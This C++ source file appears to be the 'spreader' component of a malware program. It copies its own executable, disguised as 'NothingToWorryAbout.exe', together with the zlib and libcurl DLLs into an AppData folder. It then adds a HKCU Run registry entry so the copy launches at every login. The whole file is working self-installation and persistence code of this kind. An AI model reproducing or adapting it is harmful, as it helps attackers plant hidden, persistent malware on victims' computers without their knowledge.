#include "spreader.h"


const std::wstring appName = L"\\NothingToWorryAbout.exe";


bool copyFile(const wchar_t* SRC, const wchar_t* DEST)
{
    std::ifstream src(SRC, std::ios::binary);
    std::ofstream dest(DEST, std::ios::binary);
    dest << src.rdbuf();
    return src && dest;
}

std::wstring getExePath() {
    wchar_t buffer[MAX_PATH];  //or wchar_t * buffer;
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring srcPath = L"";
    for (size_t i = 0; i < sizeof(buffer); i++)
    {
        char tmp = static_cast<char>(buffer[i]);
        if (tmp == '\0') break;
        srcPath += tmp;
    }

    return srcPath;
}

std::wstring copyFiles(std::wstring srcPath) {
    // Get path to appdata & create new folder
    std::wstring outFolder = getOutFolder();

    // Path where .exe will be copied
    std::wstring exePath = outFolder + appName;
    copyFile(srcPath.c_str(), exePath.c_str());

    // Strip filename.exe from path
    std::size_t found = srcPath.find_last_of(L"\\");
    std::wstring srcFolder = srcPath.substr(0, found + 1);
    // wcout << srcFolder;

    // Names of ddls that need to be copied
    std::wstring dlls[2] = { L"zlib1.dll", L"libcurl.dll" };

    for (size_t i = 0; i < sizeof(dlls) / sizeof(dlls[0]); i++)
    {
        std::wstring srcPathTmp = srcFolder + dlls[i];
        std::wstring destPathTmp = outFolder + L"\\" + dlls[i];
        // wcout << srcPathTmp << '\n';
        // wcout << destPathTmp << '\n';
        copyFile(srcPathTmp.c_str(), destPathTmp.c_str());
    }

    return exePath;
}

void addToRegistry(std::wstring progPath) {
    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
    LONG status = RegSetValueEx(hkey, L"NothingToWorryAbout", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}

bool checkAppName(std::wstring exePath) {
    // Strip filename.exe from path
    std::size_t found = exePath.find_last_of(L"\\");
    std::wstring exeName = exePath.substr(found, exePath.size() - 1);
    // wcout << exeName << L" " << appName << L" " << (exeName == appName);
    return (exeName == appName);
}


bool startSpread() {
    std::wstring exePath = getExePath();
    bool alreadyCopied = checkAppName(exePath);
    std::wstring progPath = copyFiles(exePath);
    addToRegistry(progPath);
    return alreadyCopied;
}